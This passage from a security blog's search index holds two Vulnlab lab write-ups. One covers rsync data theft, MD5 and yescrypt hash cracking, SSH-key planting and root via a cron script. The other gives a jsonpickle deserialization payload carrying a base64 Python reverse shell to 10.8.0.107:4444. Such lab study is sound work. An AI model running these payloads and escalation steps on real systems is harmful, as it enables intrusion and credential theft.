ports.\nsyl@sylsec:~/vulnlab/Sync$ sudo nmap -sS -sU 10.10.64.96 --min-rate 10000 --open Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-25 11:16 EET Nmap scan report for 10.10.64.96 Host is up (0.052s latency). Not shown: 1002 closed ports, 994 open|filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 873/tcp open rsync We find that the machine runs the utility rsync, which is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers by comparing the modification times and sizes of files.\nWe can connect to it by using it directly from our linux environment:\nsyl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/ httpd web backup syl@sylsec:~/vulnlab/Sync$ rsync -av --list-only rsync://10.10.64.96/httpd receiving incremental file list drwxr-xr-x 4.096 2023/04/20 22:50:04 . drwxr-xr-x 4.096 2023/04/20 23:13:22 db -rw-r--r-- 12.288 2023/04/20 22:50:42 db/site.db drwxr-xr-x 4.096 2023/04/20 22:50:50 migrate drwxr-xr-x 4.096 2023/04/20 23:13:15 www -rw-r--r-- 1.722 2023/04/20 23:02:54 www/dashboard.php -rw-r--r-- 2.315 2023/04/20 23:09:10 www/index.php -rw-r--r-- 101 2023/04/20 23:03:08 www/logout.php sent 23 bytes received 228 bytes 167,33 bytes/sec total size is 16.426 speedup is 65,44 We would see that there is an interesting file httpd/db/site.db which may contain some credentials, so let\u0026rsquo;s get that file along with the other files.\nsyl@sylsec:~/vulnlab/Sync$ rsync -chavzP --stats rsync://10.10.64.96/httpd/ ./exfiltrated/ receiving incremental file list ./ db/ db/site.db 12,29K 100% 11,72MB/s 0:00:00 (xfr#1, to-chk=3/8) migrate/ www/ www/dashboard.php 1,72K 100% 1,64MB/s 0:00:00 (xfr#2, to-chk=2/8) www/index.php 2,31K 100% 2,21MB/s 0:00:00 (xfr#3, to-chk=1/8) www/logout.php 101 100% 98,63kB/s 0:00:00 (xfr#4, to-chk=0/8) Number of files: 8 (reg: 4, dir: 4) Number of created files: 7 (reg: 4, dir: 3) Number of deleted files: 0 Number of regular files transferred: 4 Total file size: 16,43K bytes Total transferred file size: 16,43K bytes Literal data: 16,43K bytes Matched data: 0 bytes File list size: 278 File list generation time: 0,001 seconds File list transfer time: 0,000 seconds Total bytes sent: 119 Total bytes received: 2,25K sent 119 bytes received 2,25K bytes 1,58K bytes/sec total size is 16,43K speedup is 6,95 Now, let\u0026rsquo;s run sqlite3.\nsyl@sylsec:~/vulnlab/Sync$ sqlite3 ./exfiltrated/db/site.db SQLite version 3.37.2 2022-01-06 13:25:41 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .tables users sqlite\u0026gt; select * from users; 1|admin|76\u0026lt;REDACTED\u0026gt; 2|triss|a0\u0026lt;REDACTED\u0026gt; sqlite\u0026gt; We would gather those users and hashes that we need to crack. Initially, I ran those md5 hashes through the rockyou.txt list, but they didn\u0026rsquo;t match anything, so I was curious why and went to look at the source code.\nIn the file index.php located in the www folder, we would find the following code snippet:\n\u0026lt;?php session_start(); $secure = \u0026#34;6c4972f3717a5e881e282ad3105de01e\u0026#34;; if (isset($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } if (isset($_POST[\u0026#39;username\u0026#39;]) \u0026amp;\u0026amp; isset($_POST[\u0026#39;password\u0026#39;])) { $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $hash = md5(\u0026#34;$secure|$username|$password\u0026#34;); $db = new SQLite3(\u0026#39;../db/site.db\u0026#39;); $result = $db-\u0026gt;query(\u0026#34;SELECT * FROM users WHERE username = \u0026#39;$username\u0026#39; AND password= \u0026#39;$hash\u0026#39;\u0026#34;); $row = $result-\u0026gt;fetchArray(SQLITE3_ASSOC); if ($row) { $_SESSION[\u0026#39;username\u0026#39;] = $row[\u0026#39;username\u0026#39;]; header(\u0026#39;Location: dashboard.php\u0026#39;); exit(); } else { $error_message = \u0026#39;Invalid username or password.\u0026#39;; } } ?\u0026gt; We can see that the hash is being created by the value of the variable $secure the username and the password divided by a pipe.\nI cracked those hashes with my own solution written in Go, however there might be an easier way of doing that with hashcat or other hash cracking tool.\nHere is the Go code that we can use.\npackage main import ( \u0026#34;bufio\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; \u0026#34;sync\u0026#34; ) func main() { targetHash := \u0026#34;76\u0026lt;redacted\u0026gt;\u0026#34; filename := \u0026#34;/home/syl/tools/lists/rockyou.txt\u0026#34; file, err := os.Open(filename) if err != nil { panic(err) } defer file.Close() var wg sync.WaitGroup scanner := bufio.NewScanner(file) for scanner.Scan() { wg.Add(1) go func(line string) { defer wg.Done() hashedLine := hashLine(line) if hashedLine == targetHash { fmt.Printf(\u0026#34;Match found: %s\\n\u0026#34;, line) os.Exit(0) } }(scanner.Text()) } if err := scanner.Err(); err != nil { panic(err) } wg.Wait() } func hashLine(line string) string { data := []byte(\u0026#34;6c4972f3717a5e881e282ad3105de01e|admin|\u0026#34; + line) hash := md5.Sum(data) return hex.EncodeToString(hash[:]) } We can adjust the code for each user. Within seconds of running the code, we would get a match for the triss user.\nsyl@sylsec:~/vulnlab/Sync$ go run ./scripts/custom_crack.go Match found: g...\u0026lt;redacted\u0026gt; The hash of the admin wasn\u0026rsquo;t found.\nThose credentials were valid of the FTP service, and It seemed like that we are in the home directory of that user.\nWe can try to ssh with that user, but the SSH login isn\u0026rsquo;t permitted, so we can create an SSH folder .ssh from the FTP, and we can put our public SSH key into a file named authorized_keys then we would be able to connect using our public key!\nSwitching the user and Privilege Escalation We can find more users within the /etc/passwd file.\njennifer sa triss ubuntu Upon listing the directories, we would find a folder called backup which sits in the root of the file system. In that folder there are many zip files related to some kind of backup.\nWe can exfiltrate all the files and extract them to see what\u0026rsquo;s inside.\n# After the exfiltration find . -name \u0026#39;*.zip\u0026#39; -exec sh -c \u0026#39;unzip -d \u0026#34;${1%.*}\u0026#34; \u0026#34;$1\u0026#34;\u0026#39; _ {} \\; That bash one-liner would extract each zip file in its own directory.\nWe would find that those folders are mostly the same and the name of the file is a timestamp, in my specific case here are a couple of files:\n1703495041.zip -\u0026gt; Monday, December 25, 2023 9:04:01 AM 1703495161.zip -\u0026gt; Monday, December 25, 2023 9:06:01 AM 1703495281.zip -\u0026gt; Monday, December 25, 2023 9:08:01 AM We can see a pattern here, those zip files are being created every 2 minutes. We would note that and come back for it later on.\nUpon unzipping those files, we would find the following structure:\n|-- httpd | |-- db | | `-- site.db | |-- migrate | `-- www | |-- dashboard.php | |-- index.php | `-- logout.php |-- passwd |-- rsyncd.conf `-- shadow We can inspect the passwd and the shadow files, since that they are the ones that stand out at first. And having those files, we can use the utility from john called unshadow to combine the shadow and the passwd file into a single file that we can use to crack the passwords for the users.\nTo install the tool unshadow we would need to install john\n$ sudo apt install john -y unshadow ./exfiltrated/ssh/backup/1703494921/tmp/backup/passwd ./exfiltrated/ssh/backup/1703494921/tmp/backup/shadow \u0026gt; tmp_shadow Then we can crack it (or can we?):\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --wordlist=/home/syl/tools/lists/rockyou.txt No password hashes loaded (see FAQ) We cannot load those hashes in john with the default arguments because the hash function that is being used is called yescrypt. We can conclude the hashing function by inspecting the hashes that we in the tmp_shadow file.\n$y$j9T$DBxmxcNWJlhvgfWCUTbEC0\u0026lt;redacted\u0026gt; $y$j9T$jJFOBCaiGJUmyZZRFn5aG1\u0026lt;redacted\u0026gt; ... We have the starting sequence $y$ which is related to yescrypt. If you need more information about it, you can read this! We can use the argument --fromat=crypt\nsyl@sylsec:~/vulnlab/Sync$ john ./tmp_shadow --format=crypt Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 0g 0:00:00:51 0% 2/3 0g/s 87.90p/s 119.4c/s 119.4C/s leslie..boston \u0026lt;redacted\u0026gt; (jennifer) \u0026lt;redacted\u0026gt; (triss) \u0026lt;redacted\u0026gt; (sa) Now we have the passwords for the user jennifer and the user sa. Upon changing the user to jennifer we would find the user.txt hash.\nWe can not run linpeas for further enumeration on both accounts sa,jennifer and we would find that we own a file called /usr/local/bin/backup.sh. Upon inspecting the file, we would see that the file contains a script that is being used to back up the files that we saw earlier (the zipped backups).\nUsing pspy we can monitor the currently running process by all users, and we would see that a backup is being created every 2 minutes (just like the timestamps we saw earlier).\nWe can edit the script, and we can add the line chmod u+s /bin/bash to the end of it. After 2 minutes, we can see if it works by invoking /bin/bash -p, that would give us the root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-12-24-vulnlab-sync\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2024-02-29-vulnlab-unchained\/": {
        "title": "Vulnlab - Unchained [Medium]",
        "tags": [],
        "content": "We can first mount the exposed NFS folder called backup to local folder called mounted.\nsudo mount -t nfs -o nfsvers=3 10.10.89.250:/var/nfs/backup ./mounted -o nolock We can see the source code is a project that is a result from this course:\nhttps://www.udemy.com/course/build-your-own-proof-of-stake-blockchain Upon reviewing the code that we got from the mount, we can see that the /transaction path that tries to decode the value of the transaction\nThen it goes into the BlockchainUtils.decode which has the following code:\nIt is notable that the jsonpickle direct decoding can be vulnerable to deserialization, so I\u0026rsquo;ve crafted the following payload:\n{\r\u0026#34;transaction\u0026#34;: \u0026#34;{\\\u0026#34;py\\/object\\\u0026#34;: \\\u0026#34;__main__.Transaction\\\u0026#34;, \\\u0026#34;syl\\\u0026#34;: {\\\u0026#34;py\\/reduce\\\u0026#34;: [{\\\u0026#34;py\\/type\\\u0026#34;: \\\u0026#34;subprocess.Popen\\\u0026#34;}, {\\\u0026#34;py\\/tuple\\\u0026#34;: [{\\\u0026#34;py\\/tuple\\\u0026#34;: [\\\u0026#34;python3\\\u0026#34;, \\\u0026#34;-c\\\u0026#34;, \\\u0026#34;import base64;exec(base64.b64decode(\u0026#39;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguMC4xMDciLDQ0NDQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7aW1wb3J0IHB0eTsgcHR5LnNwYXduKCJiYXNoIik=\u0026#39;))\\\u0026#34;]}]}]}}\u0026#34;\r} I did this payload from scratch, but I found an article that has much more efficient payload here:\nhttps://medium.com/@0xbughunter/de-serialization-sometimes-pickle-can-be-too-sour-45c930e18b8e Nonetheless we can see that we got a connection back.\nAfter that and after a bit of enumeration we can see that snap is in the user folder which kind-a hints that. The vulnerability is CVE-2021-44731, we can find a PoC on GitHub, after that we are root.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2024-02-29-vulnlab-unchained\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

